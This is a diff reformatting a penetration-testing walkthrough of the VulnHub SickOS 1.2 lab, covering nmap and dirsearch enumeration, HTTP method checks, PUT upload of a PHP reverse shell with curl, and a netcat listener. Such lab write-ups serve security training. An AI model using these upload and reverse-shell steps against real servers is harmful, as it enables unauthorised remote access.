@@ -1,216 +1,263 @@
-<div class="page">
+# SickOS: 1.2
 
-# SickOS : 1.2
+## Machine Information
 
-\
-
-## 
-
-## SickOS : 1.2
-
-- **<span style="color:#8ff0a4;">SickOS : 1.2</span>** :-
-
-<!-- -->
-
-- Download the machine : <https://www.vulnhub.com/entry/sickos-12,144/>
+- **Machine:** SickOS: 1.2
+- **Platform:** VulnHub
+- **Download:** https://www.vulnhub.com/entry/sickos-12,144/
 
 ![](images/6-1.png)
 
-- Now unzip the file :
+---
+
+# Lab Setup
+
+1. Download the virtual machine.
+2. Extract the archive.
+3. Import it into VirtualBox.
+4. Start the virtual machine.
 
 ![](images/6-2.png)
 
 ![](images/6-3.png)
 
-- Then start the machine .
+---
 
-<!-- -->
+## Network Configuration
 
-- Automatic not assign IP to the machine :
+If the virtual machine does not receive an IP address automatically, verify the VirtualBox network adapter settings.
 
 ![](images/6-4.png)
 
-- Run nmap command to scan<span style="color:#33d17a;"> </span> :
+---
 
-<!-- -->
+# Network Enumeration
 
-- Find the machine ip :
+## Discover the Target
 
-<div class="codebox">
-
-    nmap -sn 192.168.2.0/24 
-
-</div>
+```bash
+nmap -sn 192.168.2.0/24
+```
 
 ![](images/6-5.png)
 
-- Find the available port :
+---
 
-<div class="codebox">
+## Port Scan
 
-    nmap -v -p- 192.168.2.175
-
-</div>
+```bash
+nmap -v -p- 192.168.2.175
+```
 
 ![](images/6-6.png)
 
-- Check the port what is running on these port :
+---
 
-<div class="codebox">
+## Service Enumeration
 
-    nmap -v -sT -sV -sC -A -O -p 80,22 192.168.2.175
-
-</div>
+```bash
+nmap -v -sT -sV -sC -A -O -p 80,22 192.168.2.175
+```
 
 ![](images/6-7.png)
 
-- Now check what is running in this ip : <http://192.168.2.175/>
+---
+
+# Web Enumeration
+
+Visit the target:
+
+```
+http://192.168.2.175/
+```
 
 ![](images/6-8.png)
 
-- Now run the dirsearch command :
+---
 
-<div class="codebox">
+## Directory Enumeration
 
-    dirsearch -u http://192.168.2.175/
-
-</div>
+```bash
+dirsearch -u http://192.168.2.175/
+```
 
 ![](images/6-9.png)
 
-- Parameter search in browser : <http://192.168.2.175/test/>
+---
 
-![](images/6-10.png) Directory listening enable .
+## Interesting Directory
 
-- Allowed HTTP Methods on Port 80 :
+```
+http://192.168.2.175/test/
+```
 
-<!-- -->
+Directory listing is enabled.
 
-- Using nmap to Enumerate Supported Methods :
+![](images/6-10.png)
 
-<div class="codebox">
+---
 
-    nmap -v -Pn -sT -sV -p 80 --script http-methods.nse 192.168.2.175
+# HTTP Method Enumeration
 
-</div>
+## Enumerate Supported HTTP Methods
+
+```bash
+nmap -v -Pn -sT -sV \
+-p 80 \
+--script http-methods.nse \
+192.168.2.175
+```
 
 ![](images/6-11.png)
 
-- With URL Path Specification :
+---
 
-<div class="codebox">
+## Enumerate Methods for a Specific Directory
 
-    nmap -v -Pn -sT -sV -p 80 --script http-methods.nse --script-args http-methods.url-path='/test' 192.168.2.175
-
-</div>
+```bash
+nmap -v -Pn -sT -sV \
+-p 80 \
+--script http-methods.nse \
+--script-args http-methods.url-path='/test' \
+192.168.2.175
+```
 
 ![](images/6-12.png)
 
-- Using curl to Check OPTIONS :
+---
 
-<div class="codebox">
+## Verify HTTP Methods with curl
 
-    curl -v -X OPTIONS http://192.168.2.175/test
-
-</div>
+```bash
+curl -v -X OPTIONS http://192.168.2.175/test
+```
 
 ![](images/6-13.png)
 
-- Example Usage of HTTP Methods with curl :
+---
 
-<!-- -->
+# HTTP Method Examples
 
-- GET :
+## GET
 
-<div class="codebox">
+```bash
+curl -X GET http://192.168.2.175/test
+```
 
-    curl -X GET http://192.168.2.175/test
+---
 
-</div>
+## HEAD
 
-- HEAD :
-
-<div class="codebox">
-
-    curl -I http://192.168.2.175/test
-
-</div>
+```bash
+curl -I http://192.168.2.175/test
+```
 
 ![](images/6-14.png)
 
-- POST :
+---
 
-<div class="codebox">
+## POST
 
-    curl --request POST --url http://192.168.2.175/test/post.php --header 'Content-Type: application/x-www-form-urlencoded' --data 'demo2'
+```bash
+curl \
+--request POST \
+--url http://192.168.2.175/test/post.php \
+--header "Content-Type: application/x-www-form-urlencoded" \
+--data "demo2"
+```
 
-</div>
+---
 
-- PUT – Upload a File :
+# File Upload via PUT
 
-<!-- -->
+Download the PHP reverse shell:
 
-- php-reverse-shell download here :
-  <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>
+```
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+```
 
-<!-- -->
+Edit the payload and replace the IP address with your attack machine.
 
-- Edit the file :
+```bash
+vim php-reverse-shell.php
+```
 
-<div class="codebox">
+![](images/6-15.png)
 
-    vim php-reverse-shell.php
+---
 
-</div>
+## Upload the Reverse Shell
 
-![](images/6-15.png) kali k ip dena h .
+```bash
+curl -T php-reverse-shell.php \
+http://192.168.2.175/test/
+```
 
-<div class="codebox">
+or
 
-    curl -T php-reverse-shell.php http://192.168.2.175/test/
+```bash
+curl -X PUT \
+-T php-reverse-shell.php \
+http://192.168.2.175/test/
+```
 
-</div>
+or
 
-Or with explicit method :
-
-<div class="codebox">
-
-    curl -X PUT -T php-reverse-shell.php http://192.168.2.175/test/
-
-</div>
-
-Or uploading as data :
-
-<div class="codebox">
-
-    curl -X PUT -d '<?php phpinfo(); ?>' http://192.168.2.175/test/phpinfo.php
-
-</div>
+```bash
+curl -X PUT \
+-d '<?php phpinfo(); ?>' \
+http://192.168.2.175/test/phpinfo.php
+```
 
 ![](images/6-16.png)
 
 ![](images/6-17.png)
 
-- Now take a reverse shell :
+---
 
-<div class="codebox">
+# Reverse Shell
 
-    nc -nlvp 443
+## Start a Listener
 
-</div>
+```bash
+nc -nlvp 443
+```
 
-<div class="codebox">
+---
 
-    curl -X PUT -T php-reverse-shell.php http://192.168.2.175/test/
+## Upload the Payload
 
-</div>
+```bash
+curl -X PUT \
+-T php-reverse-shell.php \
+http://192.168.2.175/test/
+```
 
 ![](images/6-18.png)
 
 ![](images/6-19.png)
 
-Click on file take a reverse shell :
+---
+
+## Trigger the Payload
+
+Open the uploaded PHP file in the browser.
 
 ![](images/6-20.png)
 
-</div>
+A reverse shell is established.
+
+---
+
+# Attack Flow
+
+1. Import and start the virtual machine.
+2. Discover the target IP.
+3. Enumerate open ports and services.
+4. Enumerate web directories.
+5. Identify that the `/test/` directory allows additional HTTP methods.
+6. Confirm supported methods using Nmap and `curl`.
+7. Upload a PHP reverse shell using the HTTP `PUT` method.
+8. Start a Netcat listener.
+9. Trigger the uploaded payload.
+10. Obtain a reverse shell.
